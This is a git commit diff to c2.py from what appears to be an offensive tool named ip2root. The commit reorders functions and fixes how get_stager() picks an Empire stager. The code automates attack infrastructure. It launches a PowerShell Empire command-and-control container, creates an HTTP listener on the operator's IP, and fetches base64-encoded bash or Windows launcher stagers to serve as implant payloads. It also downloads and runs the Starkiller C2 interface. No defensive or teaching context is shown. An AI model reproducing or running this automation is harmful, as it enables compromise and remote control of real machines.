f1e39b4fe02dc27cc214ad18e98770fe220b61f7
steels <steels.github@gmail.com>
2022-12-09 15:24:51 +0100

    fix system variable in get_stager()

--- c2.py
+++ c2.py
@@ -10,6 +10,7 @@ import sys
 import more_itertools
 import getpass
 import psutil
+import constants
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def c2(LOCAL_IP) -> None | str:
@@ -46,6 +47,38 @@ def c2(LOCAL_IP) -> None | str:
         infos = deploy_c2(LOCAL_IP)
         return infos
 
+def deploy_c2(LOCAL_IP):
+    print('[+] Deploying C2 container')
+    login_infos = get_password(False)
+    C2_LISTENER_PORT = 8888
+    client = docker.from_env()
+    container = client.containers.run(image='bcsecurity/empire:latest', ports={'1337/tcp':1337, '5000/tcp':5000, '{}/tcp'.format(C2_LISTENER_PORT):C2_LISTENER_PORT}, name='empire', tty=True, detach=True)
+    for c in more_itertools.ncycles(['|', '/', '-', '\\'], 100):
+        logs = '   ' + str(container.logs(tail=1).decode('utf-8'))
+        sys.stdout.write('\033[2K\r[+] Starting the Docker... ' + c)
+        sys.stdout.write((logs.replace('\r', '').replace('\n', '')))
+        sys.stdout.flush()
+        sleep(0.1)
+        if 'Plugin csharpserver ran successfully!' in logs:
+            print('\n[+] C2 created successfully')
+            break
+    container.exec_run("./ps-empire server --username {0} --password '{1}'".format(login_infos[0], login_infos[1]))
+    token = c2_token(login_infos[0], login_infos[1])
+    c2_listener(token, LOCAL_IP)
+    print('[+] C2 container created successfully (Docker ID : {0})'.format(container.short_id))
+    print('[+] Listener created on port {} (CLIHTTP)'.format(C2_LISTENER_PORT))
+    return container.short_id, token
+
+def check_docker():
+    res_docker = subprocess.check_output('which docker', shell=True, universal_newlines=True)
+    if 'docker' not in res_docker:
+        print('[-] Docker is not installed on your system. Please intall it from https://docs.docker.com')
+        exit
+    res_group = subprocess.check_output('id -nG "$(whoami)" | grep -qw "docker" && echo 1 || echo 0 && id -nG "$(whoami)" | grep -qw "root" && echo 1 || echo 0', shell=True, universal_newlines=True)
+    if '1' not in res_group:
+        print('[-] Your current user is not part of the docker group. Add it or start ip2root with a user that is part of the docker group.')
+        exit()
+
 def get_password(status):
     if status == True:
         username = input('[!] Enter your username to access the C2 : ')
@@ -61,17 +94,7 @@ def get_password(status):
                 print('[!] Passwords do not match. Try again please.')
     return username, password
 
-def check_docker():
-    res_docker = subprocess.check_output('which docker', shell=True, universal_newlines=True)
-    if 'docker' not in res_docker:
-        print('[-] Docker is not installed on your system. Please intall it from https://docs.docker.com')
-        exit
-    res_group = subprocess.check_output('id -nG "$(whoami)" | grep -qw "docker" && echo 1 || echo 0 && id -nG "$(whoami)" | grep -qw "root" && echo 1 || echo 0', shell=True, universal_newlines=True)
-    if '1' not in res_group:
-        print('[-] Your current user is not part of the docker group. Add it or start ip2root with a user that is part of the docker group.')
-        exit()
-
-def starkiller():
+def get_starkiller():
     STARKILLER_PATH = '/tmp/starkiller'
     if not os.path.exists(STARKILLER_PATH):
         STARKILLER_URL = 'https://github.com/BC-SECURITY/Starkiller/releases/download/v1.10.0/starkiller-1.10.0.AppImage'
@@ -102,28 +125,6 @@ def starkiller():
         sleep(1)
         subprocess.Popen([STARKILLER_PATH])
 
-def deploy_c2(LOCAL_IP):
-    print('[+] Deploying C2 container')
-    login_infos = get_password(False)
-    C2_LISTENER_PORT = 8888
-    client = docker.from_env()
-    container = client.containers.run(image='bcsecurity/empire:latest', ports={'1337/tcp':1337, '5000/tcp':5000, '{}/tcp'.format(C2_LISTENER_PORT):C2_LISTENER_PORT}, name='empire', tty=True, detach=True)
-    for c in more_itertools.ncycles(['|', '/', '-', '\\'], 100):
-        logs = '   ' + str(container.logs(tail=1).decode('utf-8'))
-        sys.stdout.write('\033[2K\r[+] Starting the Docker... ' + c)
-        sys.stdout.write((logs.replace('\r', '').replace('\n', '')))
-        sys.stdout.flush()
-        sleep(0.1)
-        if 'Plugin csharpserver ran successfully!' in logs:
-            print('\n[+] C2 created successfully')
-            break
-    container.exec_run("./ps-empire server --username {0} --password '{1}'".format(login_infos[0], login_infos[1]))
-    token = c2_token(login_infos[0], login_infos[1])
-    c2_listener(token, LOCAL_IP)
-    print('[+] C2 container created successfully (Docker ID : {0})'.format(container.short_id))
-    print('[+] Listener created on port {} (CLIHTTP)'.format(C2_LISTENER_PORT))
-    return container.short_id, token
-
 def c2_token(username, password):
     try:
         url_c2 = 'https://localhost:1337/api/admin/login'
@@ -136,7 +137,6 @@ def c2_token(username, password):
     except:
         return False
     
-
 def c2_listener(token, LOCAL_IP):
     url_listener = 'https://localhost:1337/api/listeners/http?token={0}'.format(str(token))
     param_listener = {"Name":"CLIHTTP", "Port":"8888", "Host":"{0}".format(LOCAL_IP)}
@@ -144,18 +144,12 @@ def c2_listener(token, LOCAL_IP):
     requests.post(url_listener, headers=headers, json=param_listener, verify=False)
 
 def get_stager(system, token):
-    if system == 'linux':
-        system = 'multi/bash'
-    elif system == 'windows':
-        system = 'multi/launcher'
-    else:
-        return "Error: OS not defined."
     url_stager = 'https://localhost:1337/api/stagers?token={0}'.format(token)
-    param_stager = {"StagerName":"{0}".format(system), "Listener":"CLIHTTP"}
+    param_stager = {"StagerName":constants.SYTEM_TO_STAGER[system], "Listener":"CLIHTTP"}
     headers_stager = {"Content-Type": "application/json"}
     r_stager = requests.post(url_stager, headers=headers_stager, json=param_stager, verify=False)
     payload = json.loads(r_stager.text)
-    payload = payload[system]['Output']
+    payload = payload[constants.SYTEM_TO_STAGER[system]]['Output']
     message_bytes = payload.encode('ascii')
     stager_b64 = base64.b64encode(message_bytes)
 
